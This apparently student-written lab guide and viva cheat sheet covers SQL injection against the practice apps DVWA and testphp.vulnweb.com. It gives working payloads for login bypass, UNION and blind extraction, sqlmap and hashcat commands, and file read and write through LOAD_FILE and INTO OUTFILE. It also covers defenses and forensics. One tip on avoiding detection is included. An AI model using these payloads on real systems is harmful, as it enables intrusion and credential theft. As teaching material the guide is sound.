@@ -1,0 +1,381 @@
+AIM: Examine  SQL Injection: Blind SQL injection  
+Guide Link:
+https://www.hackingarticles.in/manual-sql-injection-exploitation-step-step/
+
+4. Requirements / Tools:
+   - Kali Linux (up-to-date)
+   - DVWA installed and running (web server + MySQL). Default DVWA URL: http://127.0.0.1/dvwa/
+   - Web browser (Firefox recommended) configured to use Burp Suite proxy (optional).
+   - Burp Suite (Community is fine) — for intercepting requests and manipulating parameters.
+   - Terminal access to Kali for configuring DVWA and MySQL if needed.
+   - DVWA security level set to LOW for the experiment (done via DVWA -> DVWA Security -> low).
+   - NOTE: Only perform this on a lab VM (DVWA). Do NOT perform SQLi against systems you do not own/authorize.
+
+5. DVWA Configuration (quick):
+   a. Install/configure DVWA (skip if already done). On Kali you can install from packages or clone the repo.
+   b. Ensure MySQL/MariaDB and Apache are running:
+      sudo systemctl start apache2
+      sudo systemctl start mariadb    # or mysql
+   c. If DVWA setup page prompts, use 'Create / Reset Database' within DVWA to populate required tables.
+   d. Set DVWA Security to LOW (Important for this exercise).
+
+6. Theory (brief):
+   - SQL Injection occurs when user-supplied input is concatenated into SQL queries without proper sanitization or parameterization.
+   - In a typical authentication query:
+       SELECT * FROM users WHERE username = '<USER>' AND password = '<PASS>';
+     If attacker controls <USER> or <PASS>, they can inject SQL that alters the WHERE logic to always be true.
+   - Bypass example: setting username to 'admin' and password to: ' OR '1'='1
+     The query becomes:
+       SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1';
+     Depending on operator precedence and query structure, this can evaluate to TRUE and return a row, logging the attacker in.
+   - DVWA intentionally uses insecure PHP code to demonstrate these issues.
+
+7. Safety & Ethics:
+   - Only perform these steps in DVWA or an authorized lab environment.
+   - Do not run against production sites.
+   - Document findings responsibly and report to owners if testing real apps with permission.
+
+---------------------------------------------------------------------
+ Bypassing Authentication using SQL injection using testphp website
+---------------------------------------------------------------------
+Step 1:
+open the Website : http://testphp.vulnweb.com/index.php
+
+Extra Step
+-->  Run this command it will list all the available database
+sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs
+
+--> Run this command it will list the table in the Database 'acuart'
+sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --tables
+
+
+Step 2: so we would now do the Bind sqli attack on this site
+
+in the username enter : anything you want
+and in password copy paste this command
+' OR '1'='1
+click enter
+
+
+you will be login as mahenoor (test)
+
+---------------------------------------------
+Union Attack
+-------------------------------
+-> http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, 2, 3
+search this url in the browser you will se the result of the attack as the number 1,2,3 will be displayed
+
+
+Step 3: again in new tap paste this
+http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test'
+you will get the details of the user 'test'
+
+congratulations you successfully performed the SQLI injection UNIO attack
+---------------------------------------------------------
+ Bypassing Authentication using SQL injection using DVWA
+---------------------------------------------------------
+
+1. To install DVWA using Docker
+-> First ensure Docker is installed on your Kali Linux machine (sudo apt update && sudo apt install docker.io -y).
+
+-> Pull the official DVWA Docker image:
+sudo docker pull citizenstig/dvwa
+
+-> Run the DVWA container, mapping port 8080 to container’s port 80:
+sudo docker run -d -p 8080:80 citizenstig/dvwa
+
+-> Open your browser and go to http://localhost:8080.
+
+-> Log in with username admin and password password.
+
+-> On the DVWA home page, click on "Create/Reset database" to initialize the environment.
+
+-> Set security to Low
+
+-> Inside DVWA, go to Vulnerabilities → SQL Injection (sqli).
+
+-> in SQL injection -> user id : paste:
+1' UNION SELECT user, password FROM users-- 
+and hit enter you will get the user details
+this show the username and password using the union SQL statement
+
+-> In SQL injection (Blind)
+paste:
+1' UNION SELECT user, password FROM users-- 
+the text "User ID exists in the database."
+this shows that you have bypassed the input field
+
+
+---------------------------------------------------------------------------
+Explanation of common SQL tokens used in payloads
+---------------------------------------------------------------------------
+' (single quote)   : Delimits string literals. Breaking out of a string is the primary injection technique.
+" (double quote)   : Alternate string delimiter used by some apps or languages.
+-- (dash dash)      : MySQL inline comment (requires a trailing space/newline). Comments out remainder.
+# (hash)            : MySQL single-line comment.
+/* ... */           : C-style block comment, supported by many DBs.
+OR                  : Logical operator; `OR 1=1` forces condition to TRUE.
+AND                 : Logical operator; used to combine conditions.
+UNION SELECT        : Combine result sets from two SELECT statements — useful for data extraction.
+CONCAT()            : SQL function to concatenate strings (MySQL). Use to combine columns for display.
+SLEEP(n)            : Pause execution (MySQL) — used in time-based blind tests.
+IF(cond,a,b)        : MySQL conditional; execute SLEEP within IF to cause delays in time-based tests.
+EXISTS(subq)        : Return true if subquery returns rows — used for boolean blind checks.
+
+
+------------------------------------------------------------------------------
+Examine SQL Injection: Bypassing Authentication using SQL injection
+
+Q1. What is SQL Injection (SQLi)?
+A1. SQL Injection is a web application vulnerability where untrusted user input is concatenated into SQL queries without proper sanitization or parameterization. An attacker can manipulate the query logic to bypass authentication, extract or modify data, or execute administrative commands on the database.
+
+Q2. How does authentication bypass via SQLi work (concept)?
+A2. A login check typically runs a query like:
+
+SELECT * FROM users WHERE username = '<user>' AND password = '<pass>';
+
+
+If an attacker injects input such that the WHERE clause becomes always true (e.g., password = '' OR '1'='1'), the query can return a row even without valid credentials, allowing login as the first returned user.
+
+Q3. Give common payloads for bypassing authentication and explain each.
+A3. Common payloads (put into username or password):
+
+admin' -- : closes username and comments out password check; SQL comment truncates rest.
+
+' OR '1'='1 : closes the string and adds an OR condition that is always true.
+
+' OR 1=1 -- : numeric 1=1 avoids some quote filters; comment truncates remainder.
+Explanation: they change the WHERE clause so it evaluates TRUE irrespective of real credentials or comment out the password condition.
+
+Q4. Why do comments matter in injections? (--, #, /* ... */)
+A4. Comment tokens stop the DB from parsing the rest of the original query (often the password check or trailing quotes). This ensures the injected condition is evaluated alone. MySQL: -- (dash-dash plus space), #, and /* ... */ are supported.
+
+Q5. How can developers fix authentication SQLi?
+A5. Use parameterized queries / prepared statements (binding parameters), avoid building SQL by string concatenation, use proper password hashing (bcrypt/Argon2), limit DB account privileges, escape input only as a last resort, and hide SQL errors.
+
+Q6. What evidence do you capture in a lab for this experiment?
+A6. Screenshots: successful login with injected payload, intercepted HTTP POST (Burp) showing payload, server response showing login success, and the vulnerable PHP/SQL snippet reconstruction.
+
+Q7. What is the difference between “bypassing authentication” and “impersonation by data extraction”?
+A7. Bypassing authentication returns an existing row so app logs attacker in (often as first user). Data extraction (e.g., UNION) aims to read database contents (usernames, hashes) rather than simply gaining a session.
+
+Examine SQL Injection: Extracting Data using the UNION attack
+
+Q1. What is a UNION-based SQL injection?
+A1. UNION-based SQLi injects a UNION SELECT to append attacker-controlled rows to the resultset of the original query. If the web page displays query results, the attacker can craft UNION SELECT payloads to fetch column values (e.g., username, password hash).
+
+Q2. What are the preconditions for UNION attacks to work?
+A2. (1) The original query must return rows visible on the page. (2) Number and types (or castable types) of columns in the UNION SELECT must match the original query. (3) The DB user must have SELECT privileges.
+
+Q3. How do you determine the correct number of columns?
+A3. Use ORDER BY or trial UNION SELECT injections with incrementing null placeholders (UNION SELECT NULL, UNION SELECT NULL,NULL, ...) until the server does not error, or use ORDER BY 1,2,3... until max column index produces an error.
+
+Q4. Example UNION payload to extract username and password from users table (MySQL).
+A4. Example (assuming two columns are displayed):
+
+' UNION SELECT user, password FROM users -- 
+
+
+If more columns are needed, use NULL placeholders and CONCAT() to combine columns:
+
+' UNION SELECT 1, CONCAT(user,':',password) FROM users -- 
+
+
+Q5. What defenses mitigate UNION-based SQLi?
+A5. Use parameterized queries; restrict output encoding; avoid echoing raw DB content to HTML; use least-privilege DB users; web-application input validation; and use WAF plus error suppression.
+
+Q6. What to demonstrate in lab for this experiment?
+A6. Show UNION SELECT payloads, error messages that reveal column number mismatches, final payload retrieving usernames/hashes, and explain how you matched column counts and used CONCAT/hex constants to view results.
+
+Examine SQL Injection: Blind SQL injection
+
+Q1. What is blind SQL injection?
+A1. Blind SQLi occurs when the application does not display DB errors or data directly, but is still vulnerable. Attackers infer data by observing differences in application behavior (e.g., response content, status codes, timing).
+
+Q2. What are the two main blind SQLi techniques?
+A2. Boolean-based (content-based) and time-based (timing) blind SQLi.
+
+Q3. Explain boolean-based blind SQLi with an example.
+A3. Send a payload that evaluates a boolean condition and observe page change:
+
+' AND (SUBSTRING((SELECT password FROM users WHERE user='admin'),1,1)='a') -- 
+
+
+If true, page returns one content; if false, it returns another. By iterating over positions and characters, you extract the password.
+
+Q4. Explain time-based blind SQLi with an example (MySQL).
+A4. Use SLEEP() to cause a delay if condition is true:
+
+' AND IF(SUBSTRING((SELECT password FROM users WHERE user='admin'),1,1)='a', SLEEP(5), 0) -- 
+
+
+If response is delayed, the condition is true. Useful when content does not change but timing does.
+
+Q5. Tools and best practices for blind SQLi enumeration?
+A5. Use sqlmap with --technique=BE,TT (boolean/timing) or Burp Repeater for manual probing. Automate carefully and throttle requests to avoid detection and server overload.
+
+Q6. Lab evidence to capture?
+A6. Captured requests showing boolean difference or timing delays, a short script or sqlmap logs that retrieved data via blind methods, and explanation of character-by-character extraction.
+
+Extended SQLi: Reading Database Password Hashes
+
+Q1. Why do attackers want password hashes?
+A1. Hashes allow offline cracking with GPU/CPU resources, wordlists, and rainbow tables. If the same hash function is used elsewhere, attackers can reuse credentials. Cracked passwords = account takeover.
+
+Q2. Typical workflow to read and crack password hashes in a lab:
+A2. (1) Use SQLi (UNION or error-based) to extract username and password (hash) fields. (2) Save hashes. (3) Use tools like hashcat or john with relevant hash-mode to attempt cracking using wordlists (rockyou.txt) and rules. (4) Analyze if salted/hard-hashed (bcrypt/argon2) or weak (MD5/SHA1).
+
+Q3. How to detect hash algorithm from the hash string?
+A3. Recognize length/prefix: MD5 = 32 hex chars, SHA1 = 40 hex, bcrypt = starts with $2a$ or $2b$ and is 60 chars, Argon2 begins with $argon2. This guides which cracking mode to use.
+
+Q4. Mitigations against hash-cracking after theft:
+A4. Use modern slow hashing (bcrypt/Argon2) with per-user unique salts, enforce password complexity and rotation, multi-factor authentication (MFA), and store only hashed (not reversible) passwords.
+
+Q5. Lab items to show for viva:
+A5. SQLi payload/extraction that returns password hashes, hashcat or john command used to crack (show dictionary + rule), and final cracked cleartext password (if possible). Also explain how salts slow cracking.
+
+Extended SQLi, Protecting against SQLi, and SQLi Forensics: Protecting against SQL injection
+
+Q1. List primary secure coding practices to prevent SQLi.
+A1. - Use parameterized queries / prepared statements consistently.
+
+Use ORMs or DB APIs that enforce parameterization.
+
+Validate and whitelist input (allow-lists).
+
+Escape output (HTML encode) to prevent reflected data exploitation.
+
+Use least-privilege DB accounts.
+
+Avoid dynamic SQL where possible.
+
+Centralized input handling and security testing (SAST, DAST).
+
+Disable database error messages to end-users and log them server-side.
+
+Q2. What role does a WAF play? Limitations?
+A2. WAF can block common SQLi patterns and provide a layer of defense, but it is not a substitute for secure coding — advanced or obfuscated payloads can bypass WAFs, and false positives/negatives exist.
+
+Q3. How does parameterization prevent SQLi?
+A3. It separates code from data. The DB engine treats bound parameters as data only, not as part of the SQL syntax, so injected characters cannot change query logic.
+
+Q4. Forensics: what logs/artifacts do you collect after an SQLi incident?
+A4. Application logs (request timestamps, payloads if logged), web server access/error logs, DB logs (queries, slow query log if available), WAF logs, system logs, and backups. Preserve integrity: create forensic images and record chain-of-custody.
+
+Q5. Incident response steps for SQLi detection?
+A5. (1) Isolate affected systems, preserve logs, (2) identify vector and scope, (3) block attack patterns (WAF rules, network ACLs), (4) patch code and rotate DB credentials, (5) restore from known-good backup if necessary, (6) notify stakeholders/authorities as required.
+
+Extended SQLi, Protecting against SQLi, and SQLi Forensics: Reading Files from the Target Web Server
+
+Q1. How can SQLi be used to read files from the server? (MySQL example)
+A1. Some DB engines have functions to read server files into query results — e.g. MySQL LOAD_FILE('/path/to/file') returns file contents if the DB user has FILE privilege and the file is readable by the DB process. Attackers can inject UNION SELECT LOAD_FILE('/etc/passwd') to retrieve contents.
+
+Q2. What are common files attackers try to read?
+A2. /etc/passwd, web server config files, application config with DB credentials (e.g., /var/www/html/config.php), backup files, and SSH keys (if accessible).
+
+Q3. Defenses against file-read via DB functions:
+A3. - Remove FILE privilege from DB users used by web apps.
+
+Ensure DB process user has minimal file system access.
+
+Restrict file permissions and keep secrets out of webroot.
+
+Use secure credential vaults (not plaintext config files).
+
+Q4. Forensics and detection of file-read via SQLi?
+A4. DB audit logs showing LOAD_FILE or related functions, unusual query patterns, sudden requests for config files. Monitor file access and DB privileges.
+
+Extended SQLi, Protecting against SQLi, and SQLi Forensics: Writing Files into the Target Web Server
+
+Q1. How can SQLi lead to writing files on the web server? (MySQL example)
+A1. MySQL supports SELECT ... INTO OUTFILE '/var/www/html/shell.php' which writes query result to a server file. If an attacker can control the path and content, they can drop a web shell or backdoor.
+
+Q2. Preconditions required for writing files:
+A2. DB user must have FILE privilege and the DB process user must have write permission to the target directory. The web server must serve files from that directory.
+
+Q3. Mitigations to prevent file write via SQLi:
+A3. Remove FILE privilege for web-app DB users, ensure strict file system permissions (DB user cannot write to webroot), isolate DB and web processes, and scan webroot for new/modified files.
+
+Q4. Evidence to collect in lab for viva:
+A4. Demonstrate a harmless INTO OUTFILE writing to a non-production path (e.g., a text file in a writable test directory) and show log entries and file content. In real environments, never write backdoors — show only in lab.
+
+Practical viva checklist (what to present & explain)
+
+Setup evidence: DVWA running screenshot (or Docker docker-compose.yml), security level set to LOW for the experiments, and note of environment (Kali/Docker).
+
+Bypassing Authentication: Intercepted POST (Burp) showing payload and successful login screenshot. Explain how the payload changes SQL.
+
+UNION Attack: Show UNION SELECT payloads and page output showing extracted data (usernames/hashes). Explain matching column counts and use of CONCAT().
+
+Blind SQLi: Show a boolean or time-based payload and the observed response difference or time delay. If automated, show sqlmap output.
+
+Reading hashes & cracking: Show extracted password hash and hashcat/john command used and result (cleartext if cracked). Explain hash type and cracking rationale.
+
+File read/write: In a controlled lab, show LOAD_FILE() or INTO OUTFILE usage on safe test files and demonstrate mitigations (removal of FILE privilege).
+
+Mitigations & code fix: Show a vulnerable PHP snippet and its secure rewrite using prepared statements (PDO).
+
+Forensics & logs: Present sample logs (web server, DB) showing suspicious queries and note how you preserved them.
+
+Example viva questions (short-answer style) — memorize these
+
+Q. What is the primary cause of SQLi?
+A. Constructing SQL by concatenating unsanitized user input.
+
+Q. What SQL function can read server files in MySQL?
+A. LOAD_FILE('/path') (requires FILE privilege and file readability).
+
+Q. Which SQL variant is least useful for extraction if the app returns no errors or output?
+A. Error-based SQLi — because it relies on DB error messages; when suppressed, boolean/timing blind methods are used instead.
+
+Q. Which hashing algorithms should you avoid for storing passwords?
+A. Fast hashes like MD5, SHA1, SHA256 without salt — use slow adaptive hashes like bcrypt, Argon2, or scrypt.
+
+Q. Briefly, how do prepared statements prevent SQLi?
+A. They send the SQL template to the DB separately and bind parameters as data; input cannot change SQL structure.
+
+Example commands & tools you can quote in viva (lab-only)
+
+Start services on Kali:
+
+sudo systemctl start apache2
+
+sudo systemctl start mariadb
+
+DVWA setup (browser): http://127.0.0.1/dvwa/setup.php → Create/Reset Database.
+
+Burp to intercept POST and Repeater to test payloads.
+
+sqlmap example (POST request):
+
+sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli_auth/?id=1" \
+       --data="username=admin&password=pass&Login=Login" \
+       --cookie="security=low; PHPSESSID=xxxx" --batch --level=3
+
+
+Hash cracking (example with hashcat):
+
+Identify mode (MD5 = 0, SHA1 = 100, bcrypt = 3200 etc.), then:
+
+hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
+
+
+(Always stress: use these commands in lab environments only.)
+
+Short cheat-sheet for viva answers (copy-paste)
+
+SQLi = injection of malicious SQL into app input because of string concatenation.
+
+Bypass login: ' OR '1'='1 or admin' -- change WHERE clause or comment out checks.
+
+UNION: UNION SELECT col1, col2 FROM users extracts data if page displays DB output.
+
+Blind: boolean or time-based (SLEEP) attacks to infer data when output suppressed.
+
+Read files: MySQL LOAD_FILE() (requires FILE privilege).
+
+Write files: INTO OUTFILE (requires FILE privilege and write access).
+
+Protect: prepared statements, least-privilege DB user, salted slow hashing, input validation, WAF.
+
+Forensics: collect web logs, DB logs, WAF logs, and preserve evidence.
